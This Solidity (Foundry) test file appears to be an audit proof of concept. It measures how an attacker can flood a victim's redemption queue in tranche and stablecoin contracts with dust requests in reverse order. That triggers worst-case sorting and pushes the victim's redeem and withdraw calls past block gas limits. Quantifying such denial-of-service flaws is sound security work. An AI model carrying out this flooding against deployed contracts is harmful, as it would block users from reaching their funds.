// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { Stablecoin } from "../../../../../contracts/cap/Stablecoin.sol";
import { Tranche } from "../../../../../contracts/cap/Tranche.sol";
import { FloatingMarket } from "../../../../../contracts/cap/market/FloatingMarket.sol";
import { CapDeployer } from "../../../../../test/shared/CapDeployer.sol";
import { console } from "forge-std/console.sol";

/// @title B_P2_RequestFlood
/// @notice P2: an attacker floods a victim controller with dust redemption requests (1 wei share
/// each) and transfers them in reverse id order so `_sortIds` (insertion sort) hits its O(n^2)
/// worst case. Every id costs the victim one `unlockedSupply()` in `maxRedeem` and again in
/// `_claimFifo`; on a Tranche that is `lockedValue` -> a walk of every junior's `totalCapital`
/// -> an oracle staticcall per junior.
///
/// Prints a gas table for `maxRedeem`, 3-arg `redeem`, 3-arg `withdraw`, and the 4-arg escape
/// hatch, at n in {50, 200, 500, 1000} for 2- and 4-tranche markets and for the Stablecoin.
contract B_P2_RequestFlood is CapDeployer {
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    uint256 internal constant VICTIM_SHARES = 100e18;

    function setUp() public {
        _deployCap();
    }

    // ── harness ───────────────────────────────────────────────────────────────

    function _market(uint256 k) internal returns (address senior, address market) {
        uint256[] memory weights = new uint256[](k);
        // senior weight is the residual so it sums to one ray
        uint256 juniorWeight = 0.05e27;
        for (uint256 i = 1; i < k; ++i) {
            weights[i] = juniorWeight;
        }
        weights[0] = 1e27 - juniorWeight * (k - 1);
        address[] memory tranches;
        (market, tranches) =
            _createMarket(string.concat("K", vm.toString(k)), defaultMarketOwner, defaultBorrower, weights);
        _setMarketSlopes(market);
        FloatingMarket(market).setFixedCreditLimit(1_000_000e18);
        for (uint256 i; i < k; ++i) {
            _fundTranche(tranches[i], makeAddr(string.concat("supplier", vm.toString(i))), 1_000e18);
        }
        senior = tranches[0];
        // debt > 0 so lockedValue walks the stack and prices every junior
        vm.prank(defaultBorrower);
        FloatingMarket(market).borrow(defaultBorrower, 300e18 * k);
    }

    /// @dev attacker mints n dust requests on itself, then hands them to the victim newest-first
    function _flood(Tranche t, uint256 n) internal returns (uint256 gasRequest, uint256 gasTransfer) {
        uint256[] memory ids = new uint256[](n);
        vm.startPrank(attacker);
        uint256 g = gasleft();
        for (uint256 i; i < n; ++i) {
            ids[i] = t.requestRedeem(1, attacker, attacker);
        }
        gasRequest = (g - gasleft()) / n;
        g = gasleft();
        for (uint256 i = n; i > 0; --i) {
            t.transferRequest(ids[i - 1], victim);
        }
        gasTransfer = (g - gasleft()) / n;
        vm.stopPrank();
    }

    struct Row {
        uint256 n;
        uint256 maxRedeem;
        uint256 redeem3;
        uint256 withdraw3;
        uint256 redeem4;
        uint256 attackerPerRequest;
        uint256 attackerPerTransfer;
    }

    function _measure(Tranche t, uint256 n) internal returns (Row memory r) {
        r.n = n;
        uint256 snap = vm.snapshotState();

        (r.attackerPerRequest, r.attackerPerTransfer) = _flood(t, n);

        // victim queues after the flood so the FIFO has to chew through the dust first
        vm.prank(victim);
        uint256 legit = t.requestRedeem(VICTIM_SHARES, victim, victim);

        uint256 g = gasleft();
        uint256 maxShares = t.maxRedeem(victim);
        r.maxRedeem = g - gasleft();
        assertGt(maxShares, 0, "victim must have something claimable");

        uint256 inner = vm.snapshotState();
        vm.prank(victim);
        g = gasleft();
        t.redeem(maxShares, victim, victim);
        r.redeem3 = g - gasleft();
        vm.revertToState(inner);

        inner = vm.snapshotState();
        uint256 maxAssets = t.maxWithdraw(victim);
        vm.prank(victim);
        g = gasleft();
        t.withdraw(maxAssets, victim, victim);
        r.withdraw3 = g - gasleft();
        vm.revertToState(inner);

        uint256 claimable = t.claimableRedeemRequest(legit, victim);
        vm.prank(victim);
        g = gasleft();
        t.redeem(legit, claimable, victim, victim);
        r.redeem4 = g - gasleft();

        vm.revertToState(snap);
    }

    function _print(string memory label, Row memory r) internal pure {
        console.log(
            string.concat(
                label,
                " n=",
                vm_toString(r.n),
                " maxRedeem=",
                vm_toString(r.maxRedeem),
                " redeem3=",
                vm_toString(r.redeem3),
                " withdraw3=",
                vm_toString(r.withdraw3),
                " redeem4=",
                vm_toString(r.redeem4),
                " atk/request=",
                vm_toString(r.attackerPerRequest),
                " atk/transfer=",
                vm_toString(r.attackerPerTransfer)
            )
        );
    }

    function vm_toString(uint256 v) internal pure returns (string memory) {
        if (v == 0) return "0";
        bytes memory b;
        while (v > 0) {
            b = abi.encodePacked(uint8(48 + v % 10), b);
            v /= 10;
        }
        return string(b);
    }

    function _prep(uint256 k) internal returns (Tranche t) {
        (address senior,) = _market(k);
        t = Tranche(senior);
        _fundTranche(senior, victim, VICTIM_SHARES);
        _fundTranche(senior, attacker, 1e18);
        vm.prank(attacker);
        t.optOut(); // cheapest path for the attacker: no vesting checkpoint per request
    }

    function _run(uint256 k, uint256[] memory ns) internal {
        Tranche t = _prep(k);
        for (uint256 i; i < ns.length; ++i) {
            Row memory r = _measure(t, ns[i]);
            _print(string.concat("TRANCHE k=", vm_toString(k)), r);
        }
    }

    function _ns(uint256 a, uint256 b, uint256 c, uint256 d) internal pure returns (uint256[] memory ns) {
        uint256 len = d != 0 ? 4 : c != 0 ? 3 : b != 0 ? 2 : 1;
        ns = new uint256[](len);
        ns[0] = a;
        if (len > 1) ns[1] = b;
        if (len > 2) ns[2] = c;
        if (len > 3) ns[3] = d;
    }

    function test_P2_gasTable_2tranches() public {
        _run(2, _ns(50, 200, 500, 0));
    }

    function test_P2_gasTable_2tranches_n1000() public {
        _run(2, _ns(1000, 0, 0, 0));
    }

    function test_P2_gasTable_4tranches() public {
        _run(4, _ns(50, 200, 500, 0));
    }

    function test_P2_gasTable_4tranches_n1000() public {
        _run(4, _ns(1000, 0, 0, 0));
    }

    /// @dev Finer sweep around the 30M block gas limit for the 3-arg claims.
    function test_P2_crossing_2tranches() public {
        _run(2, _ns(250, 275, 300, 350));
    }

    function test_P2_crossing_4tranches() public {
        _run(4, _ns(225, 250, 275, 300));
    }

    /// @dev Where `maxRedeem` alone crosses 30M (an eth_call gas cap of 50M is the practical limit).
    function test_P2_maxRedeemCrossing_4tranches() public {
        Tranche t = _prep(4);
        uint256[3] memory ns = [uint256(900), 950, 1000];
        for (uint256 i; i < ns.length; ++i) {
            uint256 snap = vm.snapshotState();
            _flood(t, ns[i]);
            vm.prank(victim);
            t.requestRedeem(VICTIM_SHARES, victim, victim);
            uint256 g = gasleft();
            t.maxRedeem(victim);
            console.log(
                string.concat("TRANCHE k=4 maxRedeem-only n=", vm_toString(ns[i]), " gas=", vm_toString(g - gasleft()))
            );
            vm.revertToState(snap);
        }
    }

    /// @dev Same flood on the stablecoin, whose unlockedSupply is two SLOADs and a balanceOf.
    function test_P2_gasTable_stablecoin() public {
        _stablecoinSweep([uint256(50), 200, 500, 1000]);
    }

    function test_P2_crossing_stablecoin() public {
        _stablecoinSweep([uint256(300), 325, 350, 400]);
    }

    function _stablecoinSweep(uint256[4] memory ns) internal {
        _depositStable(victim, VICTIM_SHARES);
        _depositStable(attacker, 1e18);
        Stablecoin s = stablecoin;

        for (uint256 i; i < ns.length; ++i) {
            uint256 n = ns[i];
            uint256 snap = vm.snapshotState();
            Row memory r;
            r.n = n;
            uint256[] memory ids = new uint256[](n);
            vm.startPrank(attacker);
            uint256 g = gasleft();
            for (uint256 j; j < n; ++j) {
                ids[j] = s.requestRedeem(1, attacker, attacker);
            }
            r.attackerPerRequest = (g - gasleft()) / n;
            g = gasleft();
            for (uint256 j = n; j > 0; --j) {
                s.transferRequest(ids[j - 1], victim);
            }
            r.attackerPerTransfer = (g - gasleft()) / n;
            vm.stopPrank();

            vm.prank(victim);
            uint256 legit = s.requestRedeem(VICTIM_SHARES, victim, victim);

            g = gasleft();
            uint256 maxShares = s.maxRedeem(victim);
            r.maxRedeem = g - gasleft();

            uint256 inner = vm.snapshotState();
            vm.prank(victim);
            g = gasleft();
            s.redeem(maxShares, victim, victim);
            r.redeem3 = g - gasleft();
            vm.revertToState(inner);

            inner = vm.snapshotState();
            uint256 maxAssets = s.maxWithdraw(victim);
            vm.prank(victim);
            g = gasleft();
            s.withdraw(maxAssets, victim, victim);
            r.withdraw3 = g - gasleft();
            vm.revertToState(inner);

            uint256 claimable = s.claimableRedeemRequest(legit, victim);
            vm.prank(victim);
            g = gasleft();
            s.redeem(legit, claimable, victim, victim);
            r.redeem4 = g - gasleft();

            _print("STABLECOIN", r);
            vm.revertToState(snap);
        }
    }

    /// @dev Shedding cost: the victim can only move the gifts one at a time.
    function test_P2_victimShedCost() public {
        (address senior,) = _market(2);
        Tranche t = Tranche(senior);
        _fundTranche(senior, victim, VICTIM_SHARES);
        _fundTranche(senior, attacker, 1e18);
        uint256 n = 200;
        _flood(t, n);

        // the victim cannot shed in bulk; measure one transferRequest and one 4-arg zero-cost claim
        uint256 id = _firstId(t, victim);
        vm.prank(victim);
        uint256 g = gasleft();
        t.transferRequest(id, address(0xdead));
        console.log("victim transferRequest (shed one) gas:", g - gasleft());

        id = _firstId(t, victim);
        uint256 c = t.claimableRedeemRequest(id, victim);
        vm.prank(victim);
        g = gasleft();
        t.redeem(id, c, victim, victim);
        console.log("victim 4-arg claim of one dust request gas:", g - gasleft());
    }

    /// @dev Direct flood: `requestRedeem(1, victim, attacker)` names the victim as controller
    /// outright (no transferRequest), so ids land ascending and the insertion sort is linear.
    function test_P2_directFlood_noTransfer_2tranches() public {
        Tranche t = _prep(2);
        uint256[3] memory ns = [uint256(300), 400, 500];
        for (uint256 i; i < ns.length; ++i) {
            uint256 n = ns[i];
            uint256 snap = vm.snapshotState();
            vm.startPrank(attacker);
            uint256 g = gasleft();
            for (uint256 j; j < n; ++j) {
                t.requestRedeem(1, victim, attacker);
            }
            uint256 perReq = (g - gasleft()) / n;
            vm.stopPrank();
            vm.prank(victim);
            t.requestRedeem(VICTIM_SHARES, victim, victim);
            uint256 maxShares = t.maxRedeem(victim);
            vm.prank(victim);
            g = gasleft();
            t.redeem(maxShares, victim, victim);
            console.log(
                string.concat(
                    "DIRECT k=2 n=",
                    vm_toString(n),
                    " redeem3=",
                    vm_toString(g - gasleft()),
                    " atk/request=",
                    vm_toString(perReq)
                )
            );
            vm.revertToState(snap);
        }
    }

    function _firstId(Tranche t, address c) internal view returns (uint256 id) {
        // walk ids from 1 until one is owned by c (test-only helper)
        for (uint256 i = 1; i < 10_000; ++i) {
            if (t.controllerOf(i) == c) return i;
        }
    }
}
